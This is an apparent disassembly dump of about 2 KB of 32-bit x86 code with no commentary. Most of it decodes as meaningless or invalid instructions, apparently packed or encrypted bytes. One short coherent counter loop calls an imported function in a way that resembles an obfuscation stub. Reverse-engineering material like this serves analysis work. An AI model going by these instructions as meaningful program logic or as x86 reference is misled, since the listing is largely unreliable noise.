  411050:	ins    DWORD PTR es:[edi],dx
  411051:	imul   ebp,esp,0x6b366385
  411057:	std    
  411058:	sub    eax,0x927b0bc4
  41105d:	ret    0x886a
  411060:	add    al,0x6e
  411062:	stc    
  411063:	jge    0x4110d6
  411065:	call   0xa760f500
  41106a:	fstp   DWORD PTR [edx-0x4a39a570]
  411070:	loope  0x411039
  411072:	pop    ds
  411073:	sar    bh,1
  411075:	or     eax,0x4599f56a
  41107a:	dec    eax
  41107b:	retf   0x9d05
  41107e:	outs   dx,BYTE PTR ds:[esi]
  41107f:	repz neg DWORD PTR [ecx-0x70]
  411083:	lock pop ebx
  411085:	sub    dl,BYTE PTR [ebx]
  411087:	mov    eax,0x62e729cf
  41108c:	pop    ebx
  41108d:	push   0xffffffea
  41108f:	push   ebx
  411090:	adc    al,0x1a
  411092:	sbb    ch,cl
  411094:	mov    dl,0x7e
  411096:	adc    dl,ah
  411098:	mov    BYTE PTR [edi],dl
  41109a:	xchg   esp,eax
  41109b:	pop    edx
  41109c:	leave  
  41109d:	nop
  41109e:	xchg   esp,eax
  41109f:	mov    edi,0x63a32c07
  4110a4:	jmp    0x411123
  4110a6:	mov    ds:0x6e418b69,eax
  4110ab:	adc    eax,0xabcf5f52
  4110b0:	out    dx,al
  4110b1:	je     0x411116
  4110b3:	hlt    
  4110b4:	pop    ebx
  4110b5:	mov    ds:0xa75865bf,al
  4110ba:	(bad)  
  4110bb:	and    bl,BYTE PTR [edi+0x4a611b8f]
  4110c1:	xchg   edi,eax
  4110c2:	mov    ds:0x4ae953a5,eax
  4110c7:	sahf   
  4110c8:	push   ebp
  4110c9:	inc    esi
  4110ca:	push   0xcdf52063
  4110cf:	inc    edx
  4110d0:	iret   
  4110d1:	ds stc 
  4110d3:	push   0x46fedda1
  4110d8:	mov    ds,esp
  4110da:	adc    eax,0xffb009ba
  4110df:	and    BYTE PTR [ecx+ebx*2+0x41],cl
  4110e3:	and    BYTE PTR [edx],dl
  4110e5:	pushf  
  4110e6:	pop    esp
  4110e7:	ins    DWORD PTR es:[edi],dx
  4110e8:	xchg   edx,eax
  4110e9:	dec    edx
  4110ea:	sub    esi,DWORD PTR [ebx-0x2fb8c379]
  4110f0:	mov    ah,0x54
  4110f2:	dec    ebx
  4110f3:	add    ecx,eax
  4110f5:	pop    ss
  4110f6:	xor    ebp,DWORD PTR [eax-0x5]
  4110f9:	iret   
  4110fa:	pop    edx
  4110fb:	sub    BYTE PTR [esi],dl
  4110fd:	sbb    bl,BYTE PTR [ebx+0x2c499caa]
  411103:	int3   
  411104:	imul   ebp,edx,0x2c5332f9
  41110a:	sbb    BYTE PTR [eax-0x21],dh
  41110d:	imul   edx,DWORD PTR ds:0x35041ac,0x8939c5b
  411117:	or     dl,BYTE PTR [ecx-0x5ae7d55a]
  41111d:	enter  0x860e,0x71
  411121:	xlat   BYTE PTR ds:[ebx]
  411122:	jb     0x411186
  411124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411125:	jnp    0x411150
  411127:	int    0x26
  411129:	dec    edi
  41112a:	sbb    ecx,DWORD PTR [ebp+0x45]
  41112d:	in     al,0xc0
  41112f:	ds sbb eax,0xcf382bcc
  411135:	(bad)  
  411136:	mov    ds:0x18e5b36b,al
  41113b:	fistp  WORD PTR ss:[esi-0x51313e2f]
  411142:	cdq    
  411143:	pop    ebp
  411144:	(bad)  
  411145:	scas   eax,DWORD PTR es:[edi]
  411146:	test   eax,0x6512d64c
  41114b:	test   eax,0x9cc1b2fe
  411150:	je     0x411167
  411152:	(bad)  
  411153:	sbb    bl,BYTE PTR [edi-0x6cc3ecf4]
  411159:	mov    dh,0xeb
  41115b:	or     DWORD PTR [eax],ebx
  41115d:	aam    0x1f
  41115f:	jle    0x4111b2
  411161:	popa   
  411162:	out    0x32,eax
  411164:	pop    ebx
  411165:	jg     0x411171
  411167:	or     esi,DWORD PTR [edi+0x4bd60d09]
  41116d:	test   eax,0xb30176a1
  411172:	std    
  411173:	jmp    0x1130:0xcef2acce
  41117a:	ret    0x8f69
  41117d:	cmp    BYTE PTR [esi-0x43],cl
  411180:	mov    ebp,0x5e7ee587
  411185:	pop    ebp
  411186:	dec    ebp
  411187:	js     0x4111dd
  411189:	sub    BYTE PTR [edi+edx*8-0x74],dh
  41118d:	jo     0x411203
  41118f:	rcr    DWORD PTR [edi+0x5b],cl
  411192:	jg     0x411159
  411194:	mov    BYTE PTR [edi-0x36],al
  411197:	and    eax,0x918687cf
  41119c:	jl     0x4111a4
  41119e:	popa   
  41119f:	ret    
  4111a0:	sub    bl,BYTE PTR [ecx+ecx*2]
  4111a3:	jmp    0x95fb:0xc72d79a8
  4111aa:	das    
  4111ab:	lds    ebx,FWORD PTR [edx+0x69]
  4111ae:	out    dx,eax
  4111af:	push   0x34e9c48d
  4111b4:	ds push ebp
  4111b6:	jne    0x411190
  4111b8:	inc    ebx
  4111b9:	retf   0xb7bf
  4111bc:	or     al,0x75
  4111be:	inc    eax
  4111bf:	cmp    DWORD PTR ss:[ebp+0x5bdc4d23],ebp
  4111c6:	lahf   
  4111c7:	push   ss
  4111c8:	fwait
  4111c9:	scas   eax,DWORD PTR es:[edi]
  4111ca:	jmp    0x8839:0x9c1846a
  4111d1:	inc    ebx
  4111d2:	hlt    
  4111d3:	mov    edi,0x41d992ad
  4111d8:	sub    ecx,DWORD PTR [eax-0x147b78b7]
  4111de:	push   cs
  4111df:	inc    ebp
  4111e0:	in     eax,0x95
  4111e2:	(bad)  ds:0x994aa9ca
  4111e8:	push   cs
  4111e9:	inc    ebx
  4111ea:	mov    dh,0x30
  4111ec:	mov    edi,0xe51aedcc
  4111f1:	aam    0x85
  4111f3:	test   al,0xb0
  4111f5:	cmp    al,BYTE PTR [ebx-0x47112481]
  4111fb:	and    ch,ch
  4111fd:	sub    BYTE PTR [ebx-0x3f],dh
  411200:	sbb    BYTE PTR [eax],0xf8
  411203:	mov    ecx,0x7e8ab7e9
  411208:	dec    edx
  411209:	xchg   ebx,eax
  41120a:	ret    
  41120b:	ja     0x411200
  41120d:	sub    al,0x3b
  41120f:	add    ebp,DWORD PTR ds:0x3721ff41
  411215:	mov    edi,edi
  411217:	add    BYTE PTR [ebx+0x5eb72d64],ch
  41121d:	push   edi
  41121e:	cmp    ecx,DWORD PTR [esi]
  411220:	sbb    eax,0x2ba0c54a
  411225:	(bad)  [eax+0x56]
  411228:	push   esp
  411229:	jne    0x4111da
  41122b:	jns    0x411226
  41122d:	jl     0x4111c9
  41122f:	add    eax,0x37e664c0
  411234:	jmp    0xddbc:0x8ae0d13f
  41123b:	fst    DWORD PTR [eax+ebp*1-0x48]
  41123f:	cmp    esp,DWORD PTR [esi-0x42]
  411242:	and    al,0x74
  411244:	push   ecx
  411245:	popf   
  411246:	out    0x15,al
  411248:	gs cli 
  41124a:	(bad)  
  41124b:	rep lods al,BYTE PTR ds:[esi]
  41124d:	(bad)  
  41124e:	fs scas eax,DWORD PTR es:[edi]
  411250:	xor    al,0x54
  411252:	jge    0x411215
  411254:	and    eax,esi
  411256:	dec    edi
  411257:	pop    esi
  411258:	loop   0x41121d
  41125a:	je     0x411278
  41125c:	mov    ds:0x7b3b2870,al
  411261:	test   eax,0x3f17e49
  411266:	test   al,0x83
  411268:	pushf  
  411269:	pop    ebx
  41126a:	adc    al,0x1a
  41126c:	pop    edx
  41126d:	mov    cl,0x79
  41126f:	sub    ch,BYTE PTR [edx+0x7af4e995]
  411275:	ret    0x1ac2
  411278:	and    eax,DWORD PTR [esp+eax*2-0x57]
  41127c:	fadd   st,st(1)
  41127e:	fs dec esi
  411280:	jbe    0x411235
  411282:	call   0x4002:0xe0b0d8ec
  411289:	push   0x11cbeedb
  41128e:	pop    ss
  41128f:	scas   eax,DWORD PTR es:[edi]
  411290:	xchg   edx,eax
  411291:	js     0x411309
  411293:	mov    esp,0x151f1892
  411298:	or     al,0xf1
  41129a:	call   0xf2eb:0xfe6cdc0f
  4112a1:	dec    eax
  4112a2:	das    
  4112a3:	mov    al,0x16
  4112a5:	xor    esi,0x30
  4112a8:	mov    esi,esi
  4112aa:	or     BYTE PTR [ecx+0x52440883],al
  4112b0:	and    al,dh
  4112b2:	mov    bl,0xc4
  4112b4:	mov    bl,BYTE PTR [ebp+eiz*8-0xeb14562]
  4112bb:	lahf   
  4112bc:	cmp    ebp,DWORD PTR [ecx]
  4112be:	jg     0x4112e7
  4112c0:	jmp    0x41133f
  4112c2:	imul   esp,eax,0x74d58ea6
  4112c8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4112ca:	sbb    dh,BYTE PTR [eax+0x3d]
  4112cd:	jbe    0x4112ac
  4112cf:	sahf   
  4112d0:	rol    BYTE PTR [esi+0x43],cl
  4112d3:	fistp  WORD PTR [edi]
  4112d5:	loope  0x4112cd
  4112d7:	das    
  4112d8:	repz ja 0x411342
  4112db:	push   cs
  4112dc:	dec    ebx
  4112dd:	sbb    esp,DWORD PTR [ecx-0x269c9f73]
  4112e3:	add    esp,DWORD PTR [esi]
  4112e5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4112e7:	add    bl,BYTE PTR [edi+0x52]
  4112ea:	inc    edx
  4112eb:	cdq    
  4112ec:	jns    0x411277
  4112ee:	popf   
  4112ef:	sub    ebp,DWORD PTR [esi-0x5d24a1ec]
  4112f5:	test   al,0xc5
  4112f7:	pop    ebx
  4112f8:	inc    ebp
  4112f9:	or     ebp,DWORD PTR [ecx+0x63]
  4112fc:	pusha  
  4112fd:	lahf   
  4112fe:	ror    cl,1
  411300:	mov    ebx,0x778ee405
  411305:	push   cs
  411306:	ss enter 0x6cb2,0x5a
  41130b:	xchg   esp,eax
  41130c:	outs   dx,DWORD PTR ds:[esi]
  41130d:	xchg   ebp,eax
  41130e:	loope  0x4112c6
  411310:	fst    QWORD PTR [edi]
  411312:	sbb    ch,ch
  411314:	aad    0x3c
  411316:	(bad)  
  411317:	in     al,dx
  411318:	or     al,0x0
  41131a:	int3   
  41131b:	inc    ebx
  41131c:	cs jl  0x41134d
  41131f:	dec    ecx
  411320:	lods   eax,DWORD PTR ds:[esi]
  411321:	outs   dx,DWORD PTR ds:[esi]
  411322:	int3   
  411323:	inc    ecx
  411324:	adc    al,0xc3
  411327:	and    bl,al
  411329:	jbe    0x4113a7
  41132b:	out    0x20,eax
  41132d:	leave  
  41132e:	dec    ecx
  41132f:	(bad)  
  411330:	aam    0x40
  411332:	hlt    
  411333:	adc    DWORD PTR [ebp-0x34],edx
  411336:	xor    esp,edi
  411338:	mov    ch,cl
  41133a:	xlat   BYTE PTR ds:[ebx]
  41133b:	jae    0x41132a
  41133d:	xchg   ebx,eax
  41133e:	mov    ecx,0x6b0d666e
  411343:	mov    ebp,esi
  411345:	mov    eax,0xb149989c
  41134a:	mov    ebx,0x5fbee48e
  41134f:	pop    ecx
  411350:	jl     0x4113a9
  411352:	push   es
  411353:	retf   
  411354:	add    al,cl
  411356:	add    BYTE PTR [eax+0x30],dl
  411359:	das    
  41135a:	sbb    eax,0x3d8fc585
  41135f:	retf   0x1dcd
  411362:	shr    BYTE PTR [esi],1
  411364:	jmp    0x8af0:0x916bf856
  41136b:	(bad)  
  41136c:	jg     0x411356
  41136e:	sti    
  41136f:	fistp  QWORD PTR [ebp+eiz*8+0x29e2696a]
  411376:	pop    esp
  411377:	add    esi,esi
  411379:	sbb    eax,0xf3be631
  41137e:	sub    esi,edx
  411380:	sahf   
  411381:	mov    BYTE PTR [eax+0x2c],bh
  411384:	adc    al,0x6a
  411386:	jns    0x4113dd
  411388:	cmp    esp,DWORD PTR [edx-0x1476ca8a]
  41138e:	push   ecx
  41138f:	or     BYTE PTR ds:0x4bd98c2c,dh
  411395:	call   0x6c387c75
  41139a:	sub    ebp,ebx
  41139c:	add    dh,dh
  41139e:	push   ebp
  41139f:	xchg   edi,eax
  4113a0:	mov    esp,esi
  4113a2:	fsub   QWORD PTR [esp+edx*8]
  4113a5:	dec    esp
  4113a6:	pop    ds
  4113a7:	push   edx
  4113a8:	jge    0x411399
  4113aa:	mov    cl,BYTE PTR [edi]
  4113ac:	ficomp WORD PTR [eax]
  4113ae:	(bad)  
  4113af:	frstor [esi+0x3870a710]
  4113b5:	xor    DWORD PTR [esp+ebp*2],esp
  4113b8:	mov    esp,DWORD PTR [esi]
  4113ba:	pop    esi
  4113bb:	mov    dl,0x43
  4113bd:	addr16 push edx
  4113bf:	or     bl,BYTE PTR [ebp+0x3b6c5316]
  4113c5:	mov    bh,0x5
  4113c8:	icebp  
  4113c9:	cld    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	cmp    ebx,DWORD PTR [esi+0x59]
  41144a:	loopne 0x41145a
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x411475
  411454:	inc    esi
  411455:	out    0x72,eax
  411457:	xchg   ebx,eax
  411458:	jb     0x4113ed
  41145a:	in     eax,0xe3
  41145c:	inc    ebp
  41145d:	fist   WORD PTR [ebx-0x30]
  411460:	push   0xa517080d
  411465:	jns    0x41143c
  411467:	xchg   ebx,eax
  411468:	mov    cl,ah
  41146a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146b:	cld    
  41146c:	dec    esp
  41146d:	push   edx
  41146e:	jb     0x411475
  411470:	aad    0xca
  411472:	imul   esp,edi,0x9871b3c6
  411478:	sahf   
  411479:	pop    edi
  41147a:	test   al,0xfd
  41147c:	xor    ebx,DWORD PTR [eax+ecx*1+0x51]
  411480:	xchg   ebp,eax
  411481:	xlat   BYTE PTR ds:[ebx]
  411482:	cld    
  411483:	in     al,dx
  411484:	(bad)  
  411485:	sub    ebp,DWORD PTR [eax]
  411487:	inc    ebx
  411488:	sti    
  411489:	and    BYTE PTR [ebp+0x19e9ec50],0x6d
  411490:	jmp    0x823dc899
  411495:	scas   eax,DWORD PTR es:[edi]
  411496:	mov    esp,0xdce4fbd6
  41149b:	test   DWORD PTR [ecx-0x765106ee],esp
  4114a1:	fnstenv [ecx]
  4114a3:	lock pusha 
  4114a5:	mov    ds:0xb6782bf8,al
  4114aa:	test   eax,0xc128dca0
  4114af:	or     DWORD PTR [eax],ecx
  4114b1:	hlt    
  4114b2:	out    0xfb,al
  4114b4:	and    DWORD PTR [edi+0x28e1570e],0x3145e108
  4114be:	test   eax,0x44d94111
  4114c3:	and    al,0x6b
  4114c5:	xor    dh,BYTE PTR [edi+0x51499cec]
  4114cb:	pushf  
  4114cc:	push   edi
  4114cd:	mov    WORD PTR [edi],?
  4114cf:	loop   0x41154f
  4114d1:	mov    ds:0xe72e9b28,eax
  4114d6:	ud1    eax,DWORD PTR [edi-0x1967d67d]
  4114dd:	cmp    al,0x3c
  4114df:	cli    
  4114e0:	ss dec esi
  4114e2:	jle    0x41148e
  4114e4:	pop    esp
  4114e5:	xchg   ebx,eax
  4114e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e7:	adc    BYTE PTR [ecx-0x7d396ec0],al
  4114ed:	push   ebx
  4114ee:	push   ecx
  4114ef:	and    BYTE PTR [esi-0x138d15ae],ch
  4114f5:	sub    ecx,DWORD PTR [ebx+0x2a2d3dd8]
  4114fb:	xor    BYTE PTR [ecx-0x3c],al
  4114fe:	xchg   WORD PTR [ebx+0x65],bp
  411502:	or     DWORD PTR [edi],ebx
  411504:	fild   DWORD PTR [edx-0x22334ee5]
  41150a:	jge    0x4114bc
  41150c:	or     DWORD PTR [esi+0x7f],ebx
  41150f:	cmp    BYTE PTR [ecx-0x14],0x89
  411513:	cs int 0x76
  411516:	aad    0xdf
  411518:	xor    eax,0xbf1c29a5
  41151d:	jmp    0x617d1375
  411522:	mov    ebp,0xcbc36aa5
  411527:	or     dl,BYTE PTR [esi+0x5130dbf4]
  41152d:	outs   dx,DWORD PTR ds:[esi]
  41152e:	iret   
  41152f:	dec    ebp
  411530:	sub    eax,0x9b24dd8a
  411535:	cmp    eax,0x484c7126
  41153a:	pop    esp
  41153b:	xor    eax,0x94b3d55f
  411540:	pop    ecx
  411541:	push   edi
  411542:	cli    
  411543:	clc    
  411544:	push   esi
  411545:	push   edx
  411546:	fnstsw WORD PTR [esi]
  411548:	jg     0x411582
  41154a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41154b:	push   cs
  41154c:	loop   0x41151f
  41154e:	mov    eax,0xd36040db
  411553:	lods   al,BYTE PTR ds:[esi]
  411554:	jle    0x4114d6
  411556:	les    edx,FWORD PTR [edi-0x1e]
  411559:	mov    bl,0x25
  41155b:	out    0x4a,al
  41155d:	mov    eax,ds:0x4480fca9
  411562:	repz test bh,0x69
  411566:	sub    eax,0xe3b5ad10
  41156b:	repnz and eax,0x3dbd3cd2
  411571:	jg     0x41156d
  411573:	dec    edi
  411574:	fild   QWORD PTR fs:[ebp+0x68f8b75c]
  41157b:	(bad)
  41157f:	aas    
  411580:	out    dx,al
  411581:	push   edx
  411582:	int3   
  411583:	push   edx
  411584:	or     edx,DWORD PTR [edx-0x25]
  411587:	push   esi
  411588:	push   ecx
  411589:	xor    DWORD PTR [ebp-0x6],ecx
  41158c:	mov    BYTE PTR [eax-0x45],ch
  41158f:	push   ss
  411590:	inc    ebx
  411591:	loope  0x41153d
  411593:	aad    0x72
  411595:	mov    cl,bl
  411597:	ror    BYTE PTR [ecx-0x3d],cl
  41159a:	mov    edi,0xcd96e62e
  41159f:	outs   dx,BYTE PTR ds:[esi]
  4115a0:	test   DWORD PTR [edi+esi*8-0x3a],0x83afd23a
  4115a8:	adc    dl,al
  4115aa:	xchg   esp,eax
  4115ab:	in     eax,dx
  4115ac:	test   esi,0x43164f27
  4115b2:	ret    
  4115b3:	mov    bh,0xc9
  4115b5:	xlat   BYTE PTR ds:[ebx]
  4115b6:	sub    ah,BYTE PTR [ecx+esi*1+0x7520a67f]
  4115bd:	xor    al,0xa4
  4115bf:	mov    esi,0x440b0cd5
  4115c4:	ins    DWORD PTR es:[edi],dx
  4115c5:	loopne 0x41158e
  4115c7:	out    0x9e,al
  4115c9:	xor    eax,0xef51d8d7
  4115ce:	jp     0x411581
  4115d0:	jo     0x41157e
  4115d2:	js     0x41163f
  4115d4:	je     0x4115b2
  4115d6:	imul   ebp,DWORD PTR [eax],0x3b45cd77
  4115dc:	mov    dl,0x76
  4115de:	hlt    
  4115df:	inc    ecx
  4115e0:	int    0x3f
  4115e2:	push   0x41721ae7
  4115e7:	jge    0x411632
  4115e9:	int    0x1d
  4115eb:	push   ebp
  4115ec:	lods   eax,DWORD PTR ds:[esi]
  4115ed:	and    eax,0xd236cdb4
  4115f2:	(bad)  
  4115f3:	loopne 0x411618
  4115f5:	sbb    ebx,DWORD PTR [ebx+0x460bf87f]
  4115fb:	or     esi,ebx
  4115fd:	push   edi
  4115fe:	retf   0x20cb
  411601:	fldenv [edi+ebp*8-0x43]
  411605:	sub    eax,DWORD PTR [edi+0x7b2ba91a]
  41160b:	test   dl,ch
  41160d:	push   DWORD PTR [esi+0x5b85350f]
  411613:	cli    
  411614:	add    BYTE PTR [ecx],ah
  411616:	jmp    0x54ed:0xe84cec61
  41161d:	ffree  st(1)
  41161f:	in     eax,dx
  411620:	or     dl,BYTE PTR [eax+eax*8-0x404a63f4]
  411627:	daa    
  411628:	fild   WORD PTR [edi]
  41162a:	clc    
  41162b:	sub    eax,0xc0bc85ed
  411630:	sbb    al,0xb7
  411632:	test   DWORD PTR [eax],ecx
  411634:	aas    
  411635:	fcmovu st,st(4)
  411637:	add    al,0x56
  411639:	cmp    dl,cl
  41163b:	add    al,0x8a
  41163d:	clc    
  41163e:	jle    0x411635
  411640:	jl     0x411633
  411642:	sahf   
  411643:	sbb    eax,0x8dd8c2e3
  411648:	jno    0x411631
  41164a:	mov    esp,0x245058bb
  41164f:	sbb    DWORD PTR [esi],esi
  411651:	into   
  411652:	sbb    al,0xf0
  411654:	mov    ch,0xf2
  411656:	inc    DWORD PTR [edx+0x47664e45]
  41165c:	pop    ecx
  41165d:	int    0x4
  41165f:	or     BYTE PTR [edi+0x874b6fe],bl
  411665:	rol    DWORD PTR [eax+0x6ed97e7],1
  41166b:	adc    esp,DWORD PTR [edx+0x5b578b3f]
  411671:	pop    ecx
  411672:	mov    cl,0xc4
  411674:	(bad)  
  411675:	push   esp
  411676:	mov    ds:0xb5fabcc6,al
  41167b:	lea    ecx,[edi]
  41167d:	adc    BYTE PTR ss:[edx+edi*4-0x2be17a66],ah
  411685:	or     BYTE PTR [esi],0xcf
  411688:	xor    BYTE PTR [ecx-0xf],ch
  41168b:	inc    edi
  41168c:	pop    ss
  41168d:	test   DWORD PTR [eax+0x30],ecx
  411690:	aam    0x7f
  411692:	jno    0x411687
  411694:	stc    
  411695:	or     bh,BYTE PTR [ebx]
  411697:	cmp    ecx,DWORD PTR [edi-0x5b624c64]
  41169d:	les    edi,FWORD PTR [ebp+0x1bf4141e]
  4116a3:	rol    BYTE PTR [eax-0xe],0x40
  4116a7:	jb     0x411703
  4116a9:	sub    eax,0xadcff143
  4116ae:	mov    ah,BYTE PTR [eax-0x61]
  4116b1:	mov    cl,0xb0
  4116b3:	push   esi
  4116b4:	mov    bh,0x7
  4116b6:	adc    al,0x7f
  4116b8:	sbb    al,dl
  4116ba:	push   0xffffffd3
  4116bc:	sar    dl,0x39
  4116bf:	push   ebp
  4116c0:	cld    
  4116c1:	pop    es
  4116c2:	jb     0x4116e7
  4116c4:	jae    0x4116af
  4116c6:	xor    al,0x91
  4116c8:	push   edx
  4116c9:	fisttp DWORD PTR [ebx]
  4116cb:	xchg   edi,eax
  4116cc:	xchg   esi,eax
  4116cd:	xor    ah,BYTE PTR [edx+0x69bc599c]
  4116d3:	push   ebx
  4116d4:	sub    eax,0x80234a4
  4116d9:	jnp    0x4116d4
  4116db:	inc    edx
  4116dc:	push   0x3e5cf325
  4116e1:	pop    ebp
  4116e2:	mov    ch,0x77
  4116e4:	inc    edi
  4116e5:	dec    edx
  4116e6:	inc    ebx
  4116e7:	imul   esi,esp,0xf85fc09f
  4116ed:	ss stos BYTE PTR es:[edi],al
  4116ef:	repnz popf 
  4116f1:	lds    edi,FWORD PTR [edi]
  4116f3:	ds mov al,0x4b
  4116f6:	jg     0x411687
  4116f8:	enter  0x23ce,0x6b
  4116fc:	(bad)  
  4116fd:	fld    TBYTE PTR [ebx+esi*8+0x3aa12602]
  411704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411705:	xor    al,0x9c
  411707:	mov    al,0x97
  411709:	sbb    DWORD PTR [ebx],0xffffff89
  41170c:	(bad)  
  41170d:	retf   0x24b7
  411710:	call   0x6572:0xf1554f66
  411717:	stos   DWORD PTR es:[edi],eax
  411718:	add    al,0x51
  41171a:	adc    BYTE PTR [edi+edx*2-0x43035835],ch
  411721:	ins    BYTE PTR es:[edi],dx
  411722:	lea    esp,[esi]
  411724:	in     al,0x86
  411726:	or     al,0x47
  411728:	inc    eax
  411729:	adc    eax,edi
  41172b:	adc    eax,0x7dbe8547
  411730:	mov    dh,0xf3
  411732:	fs loopne 0x411715
  411735:	pop    ds
  411736:	add    dh,BYTE PTR ds:0x81684c80
  41173c:	mov    BYTE PTR [ecx+0x752d1d75],al
  411742:	out    0x9,al
  411744:	shl    ebx,0x79
  411747:	scas   eax,DWORD PTR es:[edi]
  411748:	das    
  411749:	pop    ebx
  41174a:	es pop esp
  41174c:	mov    bh,0x5f
  41174e:	mov    cl,BYTE PTR [edi+edx*4+0x65ed817]
  411755:	jns    0x411776
  411757:	scas   eax,DWORD PTR es:[edi]
  411758:	add    dh,dl
  41175a:	sti    
  41175b:	xchg   esi,eax
  41175c:	stc    
  41175d:	ret    0xffa7
  411760:	fnstcw WORD PTR [edi-0x21]
  411763:	or     al,0xce
  411765:	add    al,0x69
  411767:	mov    DWORD PTR [edx],esi
  411769:	fidivr DWORD PTR [esi]
  41176b:	mov    BYTE PTR [ebx+0x72d56410],cl
  411771:	enter  0xb0c7,0x66
  411775:	addr16 pop esi
  411777:	lock data16 (bad) 
  41177a:	dec    edx
  41177b:	iret   
  41177c:	pop    ebp
  41177d:	dec    edx
  41177f:	sub    ebx,DWORD PTR [ebp-0x31]
  411782:	fidiv  DWORD PTR [esp+edx*1-0x1d1572fd]
  411789:	icebp  
  41178a:	xor    ebx,DWORD PTR [edx]
  41178c:	rol    ch,cl
  41178e:	sbb    ch,BYTE PTR [esi-0x1fc66995]
  411794:	je     0x411747
  411796:	mov    ch,0xf9
  411798:	jmp    0x5f97e134
  41179d:	fisubr DWORD PTR [eax*2+0x7896e25b]
  4117a4:	jno    0x4117ce
  4117a6:	stc    
  4117a7:	call   0x732fc3c8
  4117ac:	jp     0x41182d
  4117ae:	xor    eax,0xb82c8fb5
  4117b3:	add    eax,0x80e394a9
  4117b8:	mov    cl,0xf4
  4117ba:	ja     0x411779
  4117bc:	lock pop esp
  4117be:	sbb    DWORD PTR [ebp+0x17],ecx
  4117c1:	or     eax,0xffe8b9eb
  4117c6:	push   ss
  4117c7:	int    0xc8
  4117c9:	push   0xbedf7e3e
  4117ce:	jno    0x4117e4
  4117d0:	adc    eax,0xd839edfa
  4117d5:	jne    0x41175d
  4117d7:	cmp    BYTE PTR [eax],bh
  4117d9:	or     dh,BYTE PTR [eax-0x6]
  4117dc:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4117de:	hlt    
  4117df:	push   0x37440840
  4117e4:	lds    esi,FWORD PTR [edx]
  4117e6:	pop    ecx
  4117e7:	jmp    0x48efb50f
  4117ec:	fnstsw WORD PTR [ebp-0x8]
  4117ef:	mov    ebx,0x1778834c
  4117f4:	(bad)  
  4117f5:	stos   BYTE PTR es:[edi],al
  4117f6:	pop    ecx
  4117f7:	mov    gs,eax
  4117f9:	mov    BYTE PTR [ecx],cl
  4117fb:	dec    edx
  4117fc:	fsubr  DWORD PTR [eax]
  4117fe:	daa    
  4117ff:	mov    bl,0xfd
  411801:	push   esp
  411802:	xor    BYTE PTR [edx],cl
  411804:	jmp    0x6cebe3b1
  411809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41180a:	aas    
  41180b:	jae    0x411859
  41180d:	xor    BYTE PTR [edi+0x6446d3ea],bh
  411813:	retf   0xfff4
  411816:	cmp    esi,DWORD PTR [ebx-0x6cceb153]
  41181c:	xchg   edx,eax
  41181d:	(bad)  
  41181e:	sub    BYTE PTR [edi+0xad7e5c],bl
  411824:	mov    dh,0x6d
  411826:	ror    DWORD PTR [edi-0x32b3b990],1
  41182c:	jns    0x411808
  41182e:	ja     0x411831
  411830:	in     al,0x97
  411832:	xor    eax,0x4f58f082
  411837:	pop    DWORD PTR [esi+0x758b45fd]
  41183d:	or     al,0x2b
  41183f:	ret    0x581
  411842:	cmc    
  411843:	cld    
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	jp     0x41184d
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x768ecae9],dl
  41187c:	dec    esp
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x41181b
  411886:	sahf   
  411887:	in     al,0x52
  411889:	and    BYTE PTR [eax],0x72
  41188c:	add    eax,0x1ded52ad
  411891:	ds aam 0x77
  411894:	jmp    0x1dcc:0x170ca543
  41189b:	lods   al,BYTE PTR ds:[esi]
  41189c:	xor    esp,0xffffffae
  41189f:	retf   
  4118a0:	ins    DWORD PTR es:[edi],dx
  4118a1:	loopne 0x411875
  4118a3:	jp     0x411922
  4118a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a6:	push   ds
  4118a7:	mov    edx,0x796c122f
  4118ac:	add    eax,DWORD PTR [eax]
  4118ae:	pusha  
  4118af:	mov    cs,WORD PTR [ecx]
  4118b1:	and    edx,DWORD PTR [ebp+0x29ca946d]
  4118b7:	and    al,0xc0
  4118b9:	or     DWORD PTR [ecx],0xffffff88
  4118bc:	in     al,0x38
  4118be:	pop    eax
  4118bf:	push   edx
  4118c0:	push   esi
